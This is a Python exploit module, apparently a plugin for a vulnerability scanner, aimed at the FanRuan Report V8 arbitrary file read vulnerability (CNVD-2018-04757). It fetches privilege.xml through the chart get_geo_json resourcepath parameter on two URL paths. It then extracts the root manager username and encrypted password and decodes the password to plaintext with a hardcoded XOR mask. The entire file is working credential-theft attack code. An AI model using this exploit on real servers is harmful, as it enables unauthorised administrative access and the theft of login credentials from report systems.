#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/339OfovdxZ98HHBXFnjOFQ',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '帆软报表 V8 任意文件读取漏洞 CNVD-2018-04757',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def decode_passwd(cipher):
    PASSWORD_MASK_ARRAY = [19, 78, 10, 15, 100, 213, 43, 23]  # 掩码
    Password = ""
    cipher = cipher[3:]  # 截断三位后
    for i in range(int(len(cipher) / 4)):
        c1 = int("0x" + cipher[i * 4:(i + 1) * 4], 16)
        c2 = c1 ^ PASSWORD_MASK_ARRAY[i % 8]
        Password = Password + chr(c2)
    return Password
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  targets = ['/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml','/report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml']
  try:
    res=requests.get(url=url+targets[0],headers=headers,timeout=5,verify=False)
    # print(res.text)
    resp=requests.get(url=url+targets[1],headers=headers,timeout=5,verify=False)
    # print(resp.text)
    if res.status_code == 200 and "<![CDATA[admin]]" in res.text and 'op=fr_platform]]>' in res.text and 'PrivilegeManager' in res.text and "rootManagerPassword" in res.text:
      user_name = re.findall(r'<!\[CDATA\[(.*?)]]></rootManagerName>',res.text,re.S)
      cipher = re.findall(r'<!\[CDATA\[(.*?)]]></rootManagerPassword>',res.text,re.S)
      password = decode_passwd(cipher[0])
      ret['url'] = url+targets[0]
      ret['huixian'] = '后台账号密码为：{} {}'.format(user_name[0],password)
      res.close()
      return ret
    if resp.status_code == 200 and "<![CDATA[admin]]" in resp.text and 'op=fr_platform]]>' in resp.text and 'PrivilegeManager' in resp.text and "rootManagerPassword" in resp.text:
      user_name = re.findall(r'<!\[CDATA\[(.*?)]]></rootManagerName>',resp.text,re.S)
      cipher = re.findall(r'<!\[CDATA\[(.*?)]]></rootManagerPassword>',resp.text,re.S)
      password = decode_passwd(cipher[0])
      ret['url'] = url+targets[1]
      ret['huixian'] = '后台账号密码为：{} {}'.format(user_name[0],password)
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret